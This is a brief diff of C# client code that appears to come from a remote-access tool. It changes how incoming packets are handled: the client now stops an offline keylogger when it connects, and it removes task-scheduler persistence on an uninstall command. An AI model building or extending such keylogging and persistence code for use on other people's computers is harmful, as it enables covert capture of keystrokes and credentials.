@@ -20,16 +20,16 @@ namespace Client
             pluginDelegate = new PluginDelegate(LoadPlugin);
         }
 
-
         internal static void ParsePacket(IPacket packet) 
         {
-
             try
             {
                 switch (packet.packetType)
                 {
                     case PacketType.CONNECTED:
                         StarterClass.clientHandler.baseIp = packet.baseIp;
+                        if (StarterClass.KeylogOn)
+                            ClientHandler.StopOfflineKeyLogger();
                         break;
 
                     case (PacketType.CLOSE_CLIENT):
@@ -37,7 +37,7 @@ namespace Client
                         break;
 
                     case (PacketType.UNINSTALL_CLOSE_CLIENT):
-                        Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName);
+                        Offline.Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName);
                         break;
 
                     default:
